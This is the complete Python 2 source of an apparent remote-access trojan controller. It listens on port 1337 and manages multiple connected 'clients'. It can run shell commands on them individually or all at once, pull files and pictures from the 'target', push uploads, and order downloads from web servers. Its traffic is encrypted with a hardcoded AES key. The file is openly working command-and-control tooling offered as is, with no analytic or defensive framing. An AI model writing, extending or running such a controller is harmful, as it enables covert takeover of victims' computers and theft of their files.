from Crypto.Cipher import AES
import subprocess
import socket
import base64
import time
import sys
import os


# Encryption / Decryption
##################################################

# the block size for the cipher object; must be 16 per FIPS-197
BLOCK_SIZE = 16

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)) .rstrip(PADDING)

# generate a random secret key
secret = 'gemzpFUL^6Gak^QbqDDJbgf~baMp<*h7'

# create a cipher object using the random secret
# cipher = AES.new(secret)

# encode a string
# encoded = EncodeAES(cipher, 'password')
# print 'Encrypted string:', encoded

# decode the encoded string
# decoded = DecodeAES(cipher, encoded)
# print 'Decrypted string:', decoded

##################################################
# Initializing

# clear function
clear = lambda: os.system('cls')

# initialize socket
host = '0.0.0.0'
port = 1337
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
c.bind((host, port))
c.listen(128)

# client information
active = False
clients = []
socks = []
interval = 0.8


##################################################
# Functions

# send data to client
def Send(sock, cmd, encryption, end="EOFEOFEOFEOFEOFX"):
    if encryption:
        sock.sendall(EncodeAES(cipher, cmd + end))
    else:
        sock.sendall(cmd + end)


# receive data from client
def Receive(sock, encryption, end='EOFEOFEOFEOFEOFX'):
    data = ''
    # receive first data
    l = sock.recv(1024)
    # while data is incoming
    while (l):
        if encryption:
            # decoding encoded data
            decrypted = DecodeAES(cipher, l)
        else:
            # just decoced data
            decrypted = l
        # add to the 'big' data
        data += decrypted
        # if it's the end
        if data.endswith(end):
            break
        else:
            # receive more data
            l = sock.recv(1024)
    # return the 'big' data without the end
    return data[: -len(end)]


# download file from client
def Download(sock, remote_filename, local_filename, encryption):
    # checking the params
    if not local_filename:
        local_filename = remote_filename
    try:
        # open file
        f = open(local_filename, 'wb')
    except IOError:
        # error message
        print 'Error opening '+ local_filename + '!\n'
        Send(sock, 'cd .', encryption)
        return
    # sending the download command
    Send(sock, 'download ' + remote_filename, encryption)
    # printing download message
    print 'Downloading: ' + remote_filename + ' > ' + local_filename
    time.sleep(interval)
    # receive file data
    fileData = Receive(sock, encryption)
    # print the file size
    roundedFileData = round(len(fileData)/1000000, 2)
    print 'File size: ' + str(roundedFileData) + 'MB = ' + str(len(fileData)) + 'B'
    time.sleep(interval)
    # write data into file
    f.write(fileData)
    time.sleep(interval)
    f.close()


# upload file to client
def Upload(sock, local_filename, remote_filename, encryption):
    # check if file exists
    if not remote_filename:
        remote_filename = local_filename
    try:
        f = open(local_filename, 'rb')
    except IOError:
        print 'Error opening ' + local_filename + '!\n'
        Send(sock, 'cd .', encryption)
        time.sleep(interval)
        Send(sock, '', encryption)
        time.sleep(interval)
    # start file transfer
    Send(sock, 'upload ' + remote_filename, encryption)
    print 'Uploading ' + remote_filename + ' > ' + local_filename
    while True:
        fileData = f.read()
        if not fileData:
            break
        Send(sock, fileData, encryption, '')
        roundedFileData = round(len(fileData) / 1000000, 2)
        print 'File size: ' + str(roundedFileData) + 'MB = ' + str(len(fileData)) + 'B'
    f.close()
    time.sleep(interval)
    Send(sock, '', encryption)
    time.sleep(interval)

def refresh():
    clear()
    print '\nListening for Clients...\n'
    if len(clients) > 0:
        for i in range(len(clients)):
            print '[' + str((i + 1)) + '] Client: ' + clients[i] + '\n'
    else:
        print '...\n'
    print '...\n'
    print '[0] Exit\n'
    print '[99] Send Command to all clients \n'
    print '\nPress Ctrl + C to interact with client.'


# download picture and open it
def Show(s, picture, encryption):
    Download(s, picture, picture, encryption)
    proc = subprocess.Popen('start ' + os.path.join(picture), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)


# remove client / socket
def removeSock(socks, clients, activate, interval):
    socks[activate].close()
    time.sleep(interval)
    socks.remove(socks[activate])
    clients.remove(clients[activate])
    time.sleep(interval)
    # refresh client list
    refresh()
    activate = False
    return socks, clients, activate



##################################################
# Main Program
# creating the cipher object using the secret
cipher = AES.new(secret)
while True:
    # main screen
    refresh()
    # listen for clients
    try:
        # set timeout
        c.settimeout(1)
        # accept connection
        try:
            s, a = c.accept()
        except socket.timeout:
            continue
        # add socket
        if (s):
            s.settimeout(None)
            socks += [s]
            clients += [str(a)]
        # display clients
        refresh()
        time.sleep(interval)
    except KeyboardInterrupt:
        # display clients
        refresh()
        # accept selection ... int 0/1-128
        activate = input('\nEnter option: ')
        # exit
        if activate == 0:
            print '\nExiting...\n'
            for i in range(len(socks)):
                socks[i].close()
            sys.exit()
        elif activate == 99:
            cmd = raw_input('\nEnter Command: ')
            for sock in socks:
                Send(sock, 'cmd ' + cmd, True)

        # subtract 1 (array starts at 0)
        activate -= 1
        # clear
        clear()
        print '\nActivating client ' + clients[activate] + ''
        active = True
        Send(socks[activate], 'Activate', True)
    # interact with client
    outputIsComing = True
    # command is enabled
    encryption = True
    while active:
        try:
            # receive data
            if outputIsComing:
                try:
                    data = Receive(socks[activate], encryption)
                except KeyboardInterrupt:
                    active = False
                    break
            else:
                data = 'no output anyway'
                outputIsComing = True
        # client disconnected
        except:
            print '\nClient disconnected... ' +clients[activate]
            # remove client
            socks, clients, activate = removeSock(socks, clients, activate, interval)
            break
        # exit client
        if data == 'quitted':
            print 'Exit.\n'
            # remove client
            socks, clients, activate = removeSock(socks, clients, activate, interval)
            break
        # data exists
        if data != '' and data != 'no output anyway':
            sys.stdout.write(data)
        # prompt
        Send(socks[activate], 'get current dir', encryption)
        currentDir = Receive(socks[activate], encryption)
        nextcmd = raw_input('\n[[' + str(clients[activate]).split(',')[0].split("'")[1].rstrip('(') + ']' + currentDir + ']:')
        # download
        if nextcmd.startswith('download '):
            if len(nextcmd.split(' ')) > 2:
                Download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2], encryption)
            else:
                Download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[1], encryption)
        # upload
        elif nextcmd.startswith('upload '):
            if len(nextcmd.split(' ')) > 2:
                Upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2], encryption)
            else:
                Upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[1], encryption)
        # encryption setting
        elif nextcmd.startswith('encryption'):
            if len(nextcmd.split(' ')) == 2:
                # turn encryption on
                if nextcmd.split(' ')[1] == 'on':
                    Send(socks[activate], 'encryption on', encryption)
                    encryption = True
                    print 'Encryption is on'
                # turn encryption off
                elif nextcmd.split(' ')[1] == 'off':
                    Send(socks[activate], 'encryption off', encryption)
                    encryption = False
                    print 'Encryption is off'
                # print encryption status on|off
                elif nextcmd.split(' ')[1] == 'status':
                    if encryption:
                        print 'Encryption is enabled'
                    else:
                        print 'Encryption is disabled'
            # Syntax Error
            else:
                print 'Syntax: encryption status|on|off'
            outputIsComing = False
        # show picture from target
        elif nextcmd.startswith('show '):
            Show(socks[activate], nextcmd.split(' ')[1], encryption)
        # download file from webserver to client
        elif nextcmd.startswith('downHTTP '):
            Send(socks[activate], nextcmd, encryption)
            data = Receive(socks[activate], encryption) + '\n'
            sys.stdout.write(data)
        # clear screen
        elif nextcmd.startswith('clear') or nextcmd.startswith('cls'):
            clear()
        # execute command on server
        elif nextcmd.startswith('_'):
            nextcmd = nextcmd[1:]
            proc = subprocess.Popen(nextcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdoutput = proc.stdout.read() + proc.stderr.read()
            print stdoutput
            outputIsComing = False
        # normal command
        elif nextcmd != '':
            Send(socks[activate], nextcmd, encryption)
        else:
            outputIsComing = False
